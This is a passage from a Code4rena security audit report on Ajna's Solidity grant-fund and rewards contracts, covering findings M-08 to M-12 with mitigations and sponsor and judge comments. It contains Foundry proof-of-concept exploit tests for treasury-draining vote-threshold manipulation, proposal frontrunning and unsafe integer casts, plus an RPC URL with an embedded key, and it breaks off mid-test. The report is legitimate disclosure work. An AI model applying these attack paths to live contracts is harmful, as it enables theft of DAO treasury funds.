>         vm.roll(_startBlock + 34);
>         votingPower = _getScreeningVotes(_grantFund, _tokenHolder1);
>         assertEq(votingPower, 25_000_000 * 1e18);
> 
>         // @audit at _startBlock + 35, _tokenHolder1's voting power is still 25_000_000 * 1e18, which is not 0
>         vm.roll(_startBlock + 35);
>         votingPower = _getScreeningVotes(_grantFund, _tokenHolder1);
>         assertEq(votingPower, 25_000_000 * 1e18);
>     }
> ```

**[MikeHathaway (Ajna) commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/288#issuecomment-1572931527):**
 > My mistake, you are correct. This is a real issue. Thank you for the report and the extra assertions!



***

## [[M-08] The voting thresholds in Ajna's Extraordinary Funding Mechanism can be manipulated to execute proposals below the expected threshold](https://github.com/code-423n4/2023-05-ajna-findings/issues/285)
*Submitted by [bytes032](https://github.com/code-423n4/2023-05-ajna-findings/issues/285), also found by [Ruhum](https://github.com/code-423n4/2023-05-ajna-findings/issues/287), [ktg](https://github.com/code-423n4/2023-05-ajna-findings/issues/213), and [7siech](https://github.com/code-423n4/2023-05-ajna-findings/issues/185)*

This vulnerability presents a significant risk to the Ajna treasury. A malicious actor who owns a substantial amount of tokens could manipulate the voting mechanism by burning their own tokens, thereby lowering the minimum threshold of votes required for a proposal to pass.

This tactic could allow him to siphon off substantial amounts from the treasury.

### Proof of Concept

By meeting a certain quorum of non-treasury tokens, token holders may take tokens from the treasury outside of the PFM by utilizing Extraordinary Funding Mechanism (EFM).

This mechanism works by allowing up to the percentage over 50% of non-treasury tokens (the “minimum threshold”) that vote affirmatively to be removed from the treasury – the cap on this mechanism is therefore 100% minus the minimum threshold (50% in this case).

Examples:

1.  If 51% of non-treasury tokens vote affirmatively for a proposal, up to 1% of the treasury may be withdrawn by the proposal
2.  If 65% of non-treasury tokens vote affirmatively for a proposal, up to 15% of the treasury may be withdrawn by the proposal
3.  If 50% or less of non-treasury tokens vote affirmatively for a proposal, 0% of the treasury may be withdrawn by the proposal

When submitting a proposal, the proposer must include the exact percentage of the treasury they would like to extract (“proposal threshold”), if the vote fails to reach this threshold, it will fail, and no tokens will be distributed.

Example:
a. A proposer requests 10% of the treasury

1.  50%+10%=60%
2.  If 65% of non-treasury tokens vote affirmatively, 10% of the treasury is released
3.  If 59.9% of non-treasury tokens vote affirmatively, 0% of the treasury is released

The function that checks the conditions above are true, and the proposal has succeeded is `_extraordinaryProposalSucceeded`.

<https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L164-L178>

```solidity
    function _extraordinaryProposalSucceeded(
        uint256 proposalId_,
        uint256 tokensRequested_
    ) internal view returns (bool) {
        uint256 votesReceived          = uint256(_extraordinaryFundingProposals[proposalId_].votesReceived);

        // @audit-info check _getMinimumThresholdPercentage() function
        uint256 minThresholdPercentage = _getMinimumThresholdPercentage();

        return
            // succeeded if proposal's votes received doesn't exceed the minimum threshold required

            // @audit-info check _getSliceOfNonTreasury() function
            (votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage))
            &&
            // succeeded if tokens requested are available for claiming from the treasury
            (tokensRequested_ <= _getSliceOfTreasury(Maths.WAD - minThresholdPercentage))
        ;
    }
```

The vulnerability here lies in the `_getSliceOfNonTreasury()` function.

<https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L222-L227>

```solidity
    function _getSliceOfNonTreasury(
        uint256 percentage_
    ) internal view returns (uint256) {
        uint256 totalAjnaSupply = IERC20(ajnaTokenAddress).totalSupply();
        // return ((ajnaTotalSupply - treasury) * percentage + 10**18 / 2) / 10**18;
        return Maths.wmul(totalAjnaSupply - treasury, percentage_);
    }
```

The reason is that it relies on the **current** total supply and [AjnaToken inherits ERC20Burnable](https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/token/AjnaToken.sol#L11), a malicious user can burn his tokens to lower the minimum threshold needed for votes and make the proposal pass.

Bob, a token holder, owns 10% of the Ajna supply. He creates a proposal where he requests 20% of the treasury. For his proposal to pass, Bob needs to gather 70% of the votes (50% as the threshold because there are no other funded proposals yet and an additional 20% for the tokens he requested). Unfortunately, Bob only manages to acquire 61% of the total votes.

<https://github.com/code-423n4/2023-05-ajna/blob/fc70fb9d05b13aee2b44be2cb652478535a90edd/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L206-L215>

```solidity
    function _getMinimumThresholdPercentage() internal view returns (uint256) {
        // default minimum threshold is 50
        if (_fundedExtraordinaryProposals.length == 0) {
            return 0.5 * 1e18;
        }
        // minimum threshold increases according to the number of funded EFM proposals
        else {
            // @audit-info 10 proposals max
            return 0.5 * 1e18 + (_fundedExtraordinaryProposals.length * (0.05 * 1e18));
        }
    }
```

```solidity
        return            
            // 70%              20%                
            (votesReceived >= tokensRequested_ 

							50%
			+ _getSliceOfNonTreasury(minThresholdPercentage))
            &&
            // succeeded if tokens requested are available for claiming from the treasury
            (tokensRequested_ <= _getSliceOfTreasury(Maths.WAD - minThresholdPercentage))
        ;
```

Bob then burns 10% of his own tokens. This action reduces the total supply and, consequently, the threshold too. Now, the proposal needs only 61% to pass, and since Bob already has this percentage, he can execute his proposal and siphon off funds from the treasury.

Here's a PoC that can be used to showcase the issue:

For the ease of use, please add a console.log to the `_extraordinaryProposalSucceeded` function

```diff
function _extraordinaryProposalSucceeded(
        uint256 proposalId_,
        uint256 tokensRequested_
    ) internal view returns (bool) {
        uint256 votesReceived          = uint256(_extraordinaryFundingProposals[proposalId_].votesReceived);

        uint256 minThresholdPercentage = _getMinimumThresholdPercentage();

+        console.log("tokensNeeded", tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage));

        return            
            // 50k            30k                // 50k
            (votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage))
            &&
            // succeeded if tokens requested are available for claiming from the treasury
            (tokensRequested_ <= _getSliceOfTreasury(Maths.WAD - minThresholdPercentage))
        ;
    }
```

```solidity
  function testManipulateSupply() external {
        // 14 tokenholders self delegate their tokens to enable voting on the proposals
        _selfDelegateVoters(_token, _votersArr);

        vm.roll(_startBlock + 100);

        // set proposal params
        uint256 endBlockParam = block.number + 100_000;

        // generate proposal targets
        address[] memory targets = new address[](1);
        targets[0] = address(_token);

        // generate proposal values
        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        // generate proposal calldata
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSignature(
            "transfer(address,uint256)",
            _tokenHolder1,
            50_000_001 * 1e18
        );

        // create and submit proposal
        TestProposalExtraordinary memory testProposal = _createProposalExtraordinary(
            _grantFund,
            _tokenHolder1,
            endBlockParam,
            targets,
            values,
            calldatas,
            "Extraordinary Proposal for Ajna token transfer to tester address"
        );

        vm.roll(_startBlock + 150);


        uint256 votingWeight = _grantFund.getVotesExtraordinary(_tokenHolder2, testProposal.proposalId);


        changePrank(_tokenHolder2);
        _grantFund.voteExtraordinary(testProposal.proposalId);
        
        uint256 totalSupply = _token.totalSupply();

        address bob = makeAddr("bob");

        changePrank(_tokenDeployer);

        _token.transfer(bob, _token.balanceOf(_tokenDeployer));

        changePrank(bob);
        _token.burn(_token.balanceOf(bob));

        vm.roll(_startBlock + 217_000);

        _grantFund.state(testProposal.proposalId);
    }
```

Running the test with Bob burning tokens

```solidity
        uint256 totalSupply = _token.totalSupply();

        address bob = makeAddr("bob");

        changePrank(_tokenDeployer);

        _token.transfer(bob, _token.balanceOf(_tokenDeployer));

        changePrank(bob);
        _token.burn(_token.balanceOf(bob));
```

Yields the following result:

![](https://i.imgur.com/NdNBqMs.png)

Whereas if we remove the burning, the tokens needed are increased

```diff
-        uint256 totalSupply = _token.totalSupply();

-        address bob = makeAddr("bob");

-        changePrank(_tokenDeployer);

-        _token.transfer(bob, _token.balanceOf(_tokenDeployer));

-        changePrank(bob);
-        _token.burn(_token.balanceOf(bob));
```

![](https://i.imgur.com/LMIoxYs.png)

### Recommended Mitigation Steps

To mitigate this vulnerability, consider implementing a mechanism that uses a snapshot of the total supply at the time of proposal submission rather than the current total supply. This change will prevent the threshold from being manipulated by burning tokens.

**[MikeHathaway (Ajna) acknowledged](https://github.com/code-423n4/2023-05-ajna-findings/issues/285#issuecomment-1555163118)**

**[Picodes (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/285#issuecomment-1568942705):**
 > Considering that:
>  - it is within the design of the grant system that the threshold is computed at the end of the voting period to account for potential parallel proposals and changes in the external supply
>  - however, this finding shows how large holders could significantly increase their voting power to pass an extraordinary proposal and to a significant extent manipulate the vote
>  
> I think this report and its duplicate qualify for Medium severity under "hypothetical attack path with stated assumptions, but external requirements"



***

## [[M-09] Adversary can prevent the creation of any extraordinary funding proposal by frontrunning `proposeExtraordinary()`](https://github.com/code-423n4/2023-05-ajna-findings/issues/260)
*Submitted by [juancito](https://github.com/code-423n4/2023-05-ajna-findings/issues/260), also found by [Haipls](https://github.com/code-423n4/2023-05-ajna-findings/issues/447)*

A griefing attack can be conducted to prevent the creation of any extraordinary funding proposal, or targetting specific receivers.

The cost of performing the attack is low, only involving the gas payment for the transaction.

### Proof of Concept

`ExtraordinaryFunding::proposeExtraordinary()` hashes all its inputs except for `endBlock_` when creating the `proposalId`:

```solidity
    function proposeExtraordinary(
        uint256 endBlock_,
        address[] memory targets_,
        uint256[] memory values_,
        bytes[] memory calldatas_,
        string memory description_) external override returns (uint256 proposalId_) {

        proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_)))));
```

[Link to code](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L85-L92)

This allows an adversary to frontrun the transaction, and create an exact proposal, but with an `endBlock` that will the proposal expire instantly, in a past block or whenever they want.

```solidity
        ExtraordinaryFundingProposal storage newProposal = _extraordinaryFundingProposals[proposalId_];
        // ...
        newProposal.endBlock        = SafeCast.toUint128(endBlock_);
```

[Link to code](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L94)

Nobody will be able to vote via `ExtraordinaryFunding::voteExtraordinary`, as the transaction will revert because of `proposal.endBlock < block.number`:

```solidity
        if (proposal.startBlock > block.number || proposal.endBlock < block.number || proposal.executed) {
            revert ExtraordinaryFundingProposalInactive();
        }
```

[Link to code](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/ExtraordinaryFunding.sol#L139-L141)

With no votes, the proposal can't be executed.

### Coded Proof of Concept

This test demonstrates how an adversary can frontrun the creation of an extraordinary proposal with a value of `endBlock` that will the proposal "end" instantly, while preventing the intended proposal to be created.

Add this test to `ajna-grants/test/unit/ExtraordinaryFunding.t.sol` and run `forge test -m "testProposeExtraordinary_Frontrun"`:

```solidity
    function testProposeExtraordinary_Frontrun() external {
        // The user that will try to propose the funding
        changePrank(_tokenHolder1);

        // 14 tokenholders self delegate their tokens to enable voting on the proposals
        _selfDelegateVoters(_token, _votersArr);

        vm.roll(_startBlock + 100);

        // set proposal params
        uint256 endBlockParam = block.number + 100_000;
        uint256 tokensRequestedParam = 50_000_000 * 1e18;

        // generate proposal targets
        address[] memory targets = new address[](1);
        targets[0] = address(_token);

        // generate proposal values
        uint256[] memory values = new uint256[](1);
        values[0] = 0;

        // generate proposal calldata
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSignature(
            "transfer(address,uint256)",
            _tokenHolder1,
            tokensRequestedParam
        );

        /***********************************
         *          ATTACK BEGINS          *
         ***********************************/

        // An attacker sees the proposal in the mempool and frontruns it.
        // By setting an `endBlock_ == 0`, it will create a "defeated" proposal.
        // So when the actual user tries to send the real proposal, that one will revert.
        address attacker = makeAddr("attacker");
        changePrank(attacker);
        uint256 pastEndBlockParam = 0; // @audit 
        uint256 proposalId = _grantFund.proposeExtraordinary(
            pastEndBlockParam, targets, values, calldatas, "Extraordinary Proposal for Ajna token transfer to tester address"
        );

        // Verify that the proposal is created and has a `Defeated` state
        IFunding.ProposalState proposalState = _grantFund.state(proposalId);
        assertEq(uint8(proposalState), uint8(IFunding.ProposalState.Defeated));

        /***********************************
         *           ATTACK ENDS           *
         ***********************************/

        // When the user tries to send the proposal it will always revert.
        // As a previous proposal with the same hash has been already sent, despite that having a malicious `endBlockParam`.
        changePrank(_tokenHolder1);
        vm.expectRevert(IFunding.ProposalAlreadyExists.selector);
        _grantFund.proposeExtraordinary(
            endBlockParam, targets, values, calldatas, "Extraordinary Proposal for Ajna token transfer to tester address"
        );
    }
```

### Recommended Mitigation Steps

Add `endBlock_` to the hash of the proposal. This way there will be no impact in frontrunning the transaction, as the expected proposal will be stored.

```diff
    function proposeExtraordinary(
        uint256 endBlock_,
        address[] memory targets_,
        uint256[] memory values_,
        bytes[] memory calldatas_,
        string memory description_) external override returns (uint256 proposalId_) {

-       proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_)))));
+       proposalId_ = _hashProposal(endBlock_, targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, keccak256(bytes(description_)))));
```

```diff
    function executeExtraordinary(
+       uint256 endBlock_,
        address[] memory targets_,
        uint256[] memory values_,
        bytes[] memory calldatas_,
        bytes32 descriptionHash_
    ) external nonReentrant override returns (uint256 proposalId_) {
-       proposalId_ = _hashProposal(targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, descriptionHash_)));
+       proposalId_ = _hashProposal(endBlock_, targets_, values_, calldatas_, keccak256(abi.encode(DESCRIPTION_PREFIX_HASH_EXTRAORDINARY, descriptionHash_)));
```

**[MikeHathaway (Ajna) confirmed](https://github.com/code-423n4/2023-05-ajna-findings/issues/260#issuecomment-1555118034)**



***

## [[M-10] Unsafe casting from `uint256` to `uint128` in RewardsManager](https://github.com/code-423n4/2023-05-ajna-findings/issues/227)
*Submitted by [Haipls](https://github.com/code-423n4/2023-05-ajna-findings/issues/227)*

<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L179><br>
<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L180><br>
<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L236><br>
<https://github.com/code-423n4/2023-05-ajna/blob/276942bc2f97488d07b887c8edceaaab7a5c3964/ajna-core/src/RewardsManager.sol#L241>

Unsafe casting from `uint256` to `uint128` in RewardsManager, instances:

```diff
File: 2023-05-ajna\ajna-core\src\RewardsManager.sol

178:             BucketState storage toBucket = stakeInfo.snapshot[toIndex];
+179:             toBucket.lpsAtStakeTime  = uint128(positionManager.getLP(tokenId_, toIndex));
+180:             toBucket.rateAtStakeTime = uint128(IPool(ajnaPool).bucketExchangeRate(toIndex));
181: 

235:             // record the number of lps in bucket at the time of staking
+236:             bucketState.lpsAtStakeTime = uint128(positionManager.getLP(
237:                 tokenId_,
238:                 bucketId
239:             ));
240:             // record the bucket exchange rate at the time of staking
+241:             bucketState.rateAtStakeTime = uint128(IPool(ajnaPool).bucketExchangeRate(bucketId));
```

can cause an overflow which, in turn, can lead to unforeseen consequences such as:

*   The inability to calculate new rewards, as `nextExchangeRate > exchangeRate_` will always be true after the overflow.
*   Reduced rewards because `toBucket.lpsAtStakeTime` will be reduced.
*   Reduced rewards because `toBucket.rateAtStakeTime` will be reduced.
*   In case `bucketState.rateAtStakeTime` overflows first but does not go beyond the limits in the new epoch, it will result in increased rewards being accrued.

### Proof of Concept

In `RewardsManager.stake()` and `RewardsManager.moveStakedLiquidity()`, the functions downcast `uint256` to `uint128` without checking whether it is bigger than `uint128` or not.

In `stake()` & `moveStakedLiquidity()` when `getLP >= type(uint128).max`:

```javascript
File: 2023-05-ajna\ajna-core\src\RewardsManager.sol

236:             bucketState.lpsAtStakeTime = uint128(positionManager.getLP(
237:                 tokenId_,
238:                 bucketId
239:             ));

```

Let's assume, that the staker had LP in the bucket equal `type(uint128).max`, and his stake balance LP was recorded as 0. As a result, the reward for the epoch at the moment of the stake will be accrued as

```javascript
File: 2023-05-ajna\ajna-core\src\RewardsManager.sol

504:                 interestEarned_ = Maths.wmul(nextExchangeRate - exchangeRate_, bucketLP_);

2023-05-ajna\ajna-core\src\libraries\internal\Maths.sol
11:     uint256 internal constant WAD = 1e18;
12: 
13:     function wmul(uint256 x, uint256 y) internal pure returns (uint256) {
14:         return (x * y + WAD / 2) / WAD;
15:     }
```

And will be equal to (0 + 0.5e18)/1e18=0, resulting in the user losing the reward.

In `stake() & moveStakedLiquidity()` when `bucketExchangeRate >= type(uint128).max`:<br>
If an overflow occurs and `bucketExchangeRate` is reset to zero:

```javascript
File: 2023-05-ajna\ajna-core\src\RewardsManager.sol

180:             toBucket.rateAtStakeTime = uint128(IPool(ajnaPool).bucketExchangeRate(toIndex));

241:             bucketState.rateAtStakeTime = uint128(IPool(ajnaPool).bucketExchangeRate(bucketId));

```

Results in the reward being skipped for one 1 epoch, because:

```javascript

File: ajna-core\src\RewardsManager.sol

497:             uint256 nextExchangeRate = bucketExchangeRates[pool_][bucketIndex_][nextEventEpoch_];
498: 
499:             // calculate interest earned only if next exchange rate is higher than current exchange rate
500:             if (nextExchangeRate > exchangeRate_) {
501: 
502:                 // calculate the equivalent amount of quote tokens given the stakes lp balance,
503:                 // and the exchange rate at the next and current burn events
504:                 interestEarned_ = Maths.wmul(nextExchangeRate - exchangeRate_, bucketLP_);
505:             }
```

The current rate will be equal to 0 or greater than 0, but less than the previous rate.

Also, if the next epoch has a rate less than `type(uint128).max`, this will result in `interestEarned_ = Maths.wmul(nextExchangeRate - exchangeRate_, bucketLP_);`, where `nextExchangeRate - exchangeRate_` will be in the range of `2^128 - 1 - {0, N^18}`. This can lead to an overflow error when `bucketLP_` is large `(1e45)`, because `(2^128-1) * 1e38`, which in turn can cause the transaction to fail.

```c
File: ajna-core\src\libraries\internal\Maths.sol

13:     function wmul(uint256 x, uint256 y) internal pure returns (uint256) {
14:         return (x * y + WAD / 2) / WAD;
15:     }
```

Yes, in the case of LP, the number of tokens approaching `2^128` is highly unlikely and does not pose a direct threat to the user, except for not receiving the reward. But as for the bucketExchangeRate, since it is calculated according to different formulas, it cannot be ruled out that such a case is more likely

**Tests for LP, which simply shows that overflow occurs:**

```diff

diff --git a/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol b/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol
index 4100e9f..58c3d8c 100644
--- a/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol
+++ b/ajna-core/tests/forge/unit/Rewards/RewardsManager.t.sol
@@ -8,7 +8,7 @@ import 'src/interfaces/rewards/IRewardsManager.sol';

 import { ERC20Pool }           from 'src/ERC20Pool.sol';
 import { RewardsHelperContract }   from './RewardsDSTestPlus.sol';
-
+import '@std/console2.sol';
 contract RewardsManagerTest is RewardsHelperContract {

     address internal _borrower;
@@ -127,6 +127,33 @@ contract RewardsManagerTest is RewardsHelperContract {
         });
     }

+    function test_Issue() external {
+        // configure NFT position one
+        uint256[] memory depositIndexes = new uint256[](1);
+        depositIndexes[0] = 9;
+        uint256 mintAmount = uint256(type(uint128).max) + 1;
+        uint256 tokenIdOne = _mintAndMemorializePositionNFT({
+            indexes:    depositIndexes,
+            minter:     _minterOne,
+            mintAmount: mintAmount,
+            pool:       address(_pool)
+        });
+        uint256 lpBalance;
+        (lpBalance, ) =_pool.lenderInfo(depositIndexes[0], address(_positionManager));
+        console2.log("_pool.lenderInfo for _positionManager before stake", lpBalance);
+
+        // minterOne deposits their NFT into the rewards contract
+        _stakeToken({
+            pool:    address(_pool),
+            owner:   _minterOne,
+            tokenId: tokenIdOne
+        });
+        uint256 lpsAtStakeTime;
+        uint256 rateAtStakeTime;
+        (lpsAtStakeTime, rateAtStakeTime) = _rewardsManager.getBucketStateStakeInfo(tokenIdOne, depositIndexes[0]);
+        console2.log("getBucketStateStakeInfo.lpsAtStakeTime after stake", lpsAtStakeTime);
+    }
+    
```

### Tools Used

*   Manual review
*   Foundry

### Recommended Mitigation Steps

*   use OpenZeppelin’s SafeCast library when casting from uint256 to uint128.
*   don't make casting from uint256 to uint128

**[MikeHathaway (Ajna) confirmed](https://github.com/code-423n4/2023-05-ajna-findings/issues/227#issuecomment-1555112539)**

**[Picodes (judge) commented](https://github.com/code-423n4/2023-05-ajna-findings/issues/227#issuecomment-1570236882):**
 > Valid for the case of `bucketExchangeRate`.



***

## [[M-11] `StandardFunding.fundingVote` should not allow users who didn't vote in screening stage to vote](https://github.com/code-423n4/2023-05-ajna-findings/issues/224)
*Submitted by [nobody2018](https://github.com/code-423n4/2023-05-ajna-findings/issues/224)*

<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L519-L569><br>
<https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L519>

Users who did not vote in the screening stage but voted in the funding stage are not allowed to claim rewards via `claimDelegateReward`. **Voting in the funding stage will occupy the distribution ratio of rewards**. Since these rewards cannot be claimed, in the long run, the ajnaToken balance of the GrantFund contract is inconsistent with `treasury`.

### Proof of Concept

At the beginning of the `StandardFunding.claimDelegateReward` function, check whether the caller voted in the screening stage.

```solidity
function claimDelegateReward(
        uint24 distributionId_
    ) external override returns(uint256 rewardClaimed_) {
        // Revert if delegatee didn't vote in screening stage
->      if(screeningVotesCast[distributionId_][msg.sender] == 0) revert DelegateRewardInvalid();

        QuarterlyDistribution memory currentDistribution = _distributions[distributionId_];
        ...
    }
```

`StandardFunding.fundingVote` is used to vote in the funding stage. This function does not check whether the caller voted in the screening stage. `fundingVote` subcalls [\_fundingVote](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L612), which affects the allocation of rewards. `_getDelegateReward` is used by `claimDelegateReward` to calculate the reward distributed to the caller.

```solidity
function _getDelegateReward(
        QuarterlyDistribution memory currentDistribution_,
        QuadraticVoter memory voter_
    ) internal pure returns (uint256 rewards_) {
        // calculate the total voting power available to the voter that was allocated in the funding stage
        uint256 votingPowerAllocatedByDelegatee = voter_.votingPower - voter_.remainingVotingPower;

        // if none of the voter's voting power was allocated, they receive no rewards
        if (votingPowerAllocatedByDelegatee == 0) return 0;

        // calculate reward
        // delegateeReward = 10 % of GBC distributed as per delegatee Voting power allocated
->      rewards_ = Maths.wdiv(
            Maths.wmul(
                currentDistribution_.fundsAvailable,	//total funds in current distribution
                votingPowerAllocatedByDelegatee		//voter's vote power
            ),
            currentDistribution_.fundingVotePowerCast	//total vote power in current distribution
        ) / 10;						// 10% fundsAvailable
    }
```

As long as `fundingVote` is successfully called, it means that **the reward is locked to the caller**. However, the caller cannot claim these rewards. **There is no code to calculate the amount of these rewards that can never be claimed**.

### Recommended Mitigation Steps

Two ways to fix this problem:

1.  `FundingVote` does not allow users who didn't vote in screening stage.
2.  Delete the code on line [L240](https://github.com/code-423n4/2023-05-ajna/blob/main/ajna-grants/src/grants/base/StandardFunding.sol#L240).

**[MikeHathaway (Ajna) confirmed](https://github.com/code-423n4/2023-05-ajna-findings/issues/224#issuecomment-1555111296)**



***

## [[M-12] Governance attack on Extraordinary Proposals](https://github.com/code-423n4/2023-05-ajna-findings/issues/164)
*Submitted by [0xRobocop](https://github.com/code-423n4/2023-05-ajna-findings/issues/164), also found by [sces60107](https://github.com/code-423n4/2023-05-ajna-findings/issues/294), [ktg](https://github.com/code-423n4/2023-05-ajna-findings/issues/184), [rvierdiiev](https://github.com/code-423n4/2023-05-ajna-findings/issues/173), and [Dug](https://github.com/code-423n4/2023-05-ajna-findings/issues/154)*

The mechanics for Extraordinary proposals are simple and robust for attacks. There is a variable that is called Minimum Threshold (MT). The maximum amount of treasury tokens that can be requested on a proposal is bounded by MT. Basically, you can request any amount of tokens up to a maximum percentage of (1 - MT).

For a proposal to succeed, it needs a percentage of non-treasury tokens equal or greater than:

`MT + percentage of treasury tokens requested`

Quoting the whitepaper:

    a. A proposer requests tokens equivalent to 10% of the treasury
       i. 50% + 10% = 60%
       ii. If 65% of non-treasury tokens vote affirmatively, 10% of the treasury is released
       iii. If 59.9% of non-treasury tokens vote affirmatively, 0% of the treasury is released

For example, if you want to request the max percentage of treasury tokens, that is `1 - MT`, the proposal will need `(1 - MT) + MT` percentage of non-treasury tokens, it means 100%. Note that I am not giving a specific value for `MT`, so this should hold for any extraordinary proposal, even when the value of `MT` changes. The design is correct, but the implementation is not. The implementation of the constraint of votes needed for a proposal is implemented as follows:

`votesReceived >= tokensRequested_ + _getSliceOfNonTreasury(minThresholdPercentage)`

To see where is the mistake, we must convert the above formula into percentages, so we can compared it with what is written in the whitepaper. We know that `votesReceived` is some percentage (P1) of Non-treasury tokens, `tokensRequested` is some percentage (P2) of treasury tokens and `_getSliceOfNonTreasury(minThresholdPercentage)` is some percentage (P3) of Non-treasury tokens.

We also know that P2 is bounded by the minimum threshold, because we want to test the case where the maximum is requested then P2 becomes `(1 - MT)` and we know that P3 is `MT`. Re-writing:

`(P1)(NonTreasuryT) = (1 - MT)(TreasuryT) + (MT)(NonTreasuryT)`

I changed `>=` for `=` because I am interested on the minimum votes needed. Divide by `NonTreasuryT`, rewrite:

`P1 = ((1 - MT)(TreasuryT) / (NonTreasuryT)) + MT`

Now we have the formula re-written in terms of percentages, where we can see that `1 - MT` which is the percentage of requested treasury tokens is multiplied by the division of `TreasuryT / NonTreasuryT`. This has the consequence of reducing `1 - MT` since `NonTreasuryT` will be greater than `TreasuryT`. For example, let's take the case where the 1st proposal request the maximum amount of treasury tokens, that is, 50%.

`P1 = ((50%)(TreasuryT) / (NonTreasuryT)) + 50%`

Is clearly to see that P1 will be smaller than 100% (in the case where TreasuryT < NonTreasuryT), violating the design described on the whitepaper.

The proof of concept presented below is a scenario based on a total supply of 1B tokens, and a treasury of 300M tokens. In this scenario:

`P1 = ((50%)(300M) / (700M)) + 50% == 71.4%`

If we want to request again the maximum treasury tokens on the second proposal we will need:

`P1 = ((45%)(150M) / (850M)) + 55% == 62.94%`

We see a reduction on the percentage of non-treasury tokens needed between proposals, which should not happen, remember than on the design described on the whitepaper a proposal always need 100% of non treasury tokens when requesting the max amount of treasury tokens, no mattering the value of `MT`.

The PoC shows a possible scenario where an attacker can take advantage of this mistake that will allow him to drain the treasury if he manages to execute the first proposal.

The PoC is based on the assumption that the attacker manages to get a big portion (385M out of 700 non treasury tokens) of ajna tokens and convince other holders (115M of tokens) to vote (or delegate to him) for his proposal requesting the 50% of the treasury. If the attacker manages to achieve this, then he can drain the treasury alone, using the next proposals (because of the reduction of the percentage needed), even without the help of the previous holders.

### Proof of Concept

1. Create a file under `test/unit/` and call it `ExploitEF.t.sol`

2. Copy and paste the following:

    // SPDX-License-Identifier: MIT
    pragma solidity 0.8.16;

    import { GrantFund }             from "../../src/grants/GrantFund.sol";
    import { IExtraordinaryFunding } from "../../src/grants/interfaces/IExtraordinaryFunding.sol";
    import { IFunding }              from "../../src/grants/interfaces/IFunding.sol";
    import { GrantFundTestHelper }   from "../utils/GrantFundTestHelper.sol";
    import { IAjnaToken }            from "../utils/IAjnaToken.sol";
    import { DrainGrantFund }        from "../interactions/DrainGrantFund.sol";

    contract ExploitEF is GrantFundTestHelper {

        IAjnaToken        internal  _token;
        GrantFund         internal  _grantFund;

        // Ajna token Holder at the Ajna contract creation on mainnet
        address internal _tokenDeployer  = 0x666cf594fB18622e1ddB91468309a7E194ccb799;
        address internal _attacker   = makeAddr("_tokenHolder1");
        address internal _tokenHolder2   = makeAddr("_tokenHolder2");
        address internal _tokenHolder3   = makeAddr("_tokenHolder3");
        address internal _tokenHolder4   = makeAddr("_tokenHolder4");
        address internal _tokenHolder5   = makeAddr("_tokenHolder5");
        address internal _tokenHolder6   = makeAddr("_tokenHolder6");

        address[] internal _votersArrAttacker = [
            _attacker
        ];

        address[] internal _votersArr = [
            _tokenHolder2,
            _tokenHolder3,
            _tokenHolder4,
            _tokenHolder5,
            _tokenHolder6
        ];

        address[] internal _helperAttackerDelegatee = [
          _attacker,
          _attacker,
          _attacker,
          _attacker,
          _attacker
        ];

        // at this block on mainnet, all ajna tokens belongs to _tokenDeployer
        uint256 internal _startBlock      = 16354861;
        // at this block on mainnet, 1B ajna tokens where burned, reducing the supply to 1B.
        uint256 internal _startBlock2      = 16478160;

        function setUp() external {
            vm.createSelectFork("https://eth-mainnet.g.alchemy.com/v2/V2bjD46crGUhn4EDk92txmvC0BFqLzjo", _startBlock2);

            vm.startPrank(_tokenDeployer);

            // Ajna Token contract address on mainnet
            _token = IAjnaToken(0x9a96ec9B57Fb64FbC60B423d1f4da7691Bd35079);

            // deploy growth fund contract
            _grantFund = new GrantFund();

            // initial minter distributes tokens to test addresses
            _transferAjnaTokens(_token, _votersArrAttacker, 385_000_000 * 1e18, _tokenDeployer);
            _transferAjnaTokens(_token, _votersArr, 23_000_000 * 1e18, _tokenDeployer);

            // initial minter distributes treasury to grantFund
            // A treasury with 300M ajna tokens (Using whitepaper values)
            changePrank(_tokenDeployer);
            _token.approve(address(_grantFund), 300_000_000 * 1e18);
            _grantFund.fundTreasury(300_000_000 * 1e18);
        }    

